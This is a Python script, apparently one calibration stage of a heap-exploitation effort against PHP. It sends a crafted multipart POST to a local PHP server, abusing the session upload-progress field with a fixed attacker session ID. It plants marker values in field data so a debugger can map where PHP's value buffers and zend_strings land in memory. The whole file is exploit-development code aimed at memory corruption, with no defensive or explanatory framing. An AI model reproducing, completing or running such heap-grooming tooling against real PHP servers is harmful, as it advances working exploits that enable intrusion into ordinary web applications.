#!/usr/bin/env python3
"""Calibration request B: place unique markers in multipart field values so gdb
can locate where the 56B raw value buffers and 192B zend_strings land.

usage: cal_b.py N1 N2 L1 L2 [m1_hex] [m2_hex]
"""
import socket, struct, sys
N1=int(sys.argv[1]); N2=int(sys.argv[2]); L1=int(sys.argv[3]); L2=int(sys.argv[4])
M1=int(sys.argv[5],0) if len(sys.argv)>5 else 0x1122334455667788
M2=int(sys.argv[6],0) if len(sys.argv)>6 else 0xdeadbeefcafebabe
BND=b'B'*10; HOST='127.0.0.1'; PORT=8088; SID=b'attacksessionid0001'
val1=bytearray(b'Q'*L1)
if L1>=0x68: struct.pack_into('<Q',val1,0x60,M1)
val2=bytearray(b'Z'*L2)
if L2>=0x18: struct.pack_into('<Q',val2,0x10,M2)
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N1):
    parts.append({'name':('a%030d'%i)[:31],'data':bytes(val1)})
for i in range(N2):
    parts.append({'name':('f%02d'%i),'data':bytes(val2)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
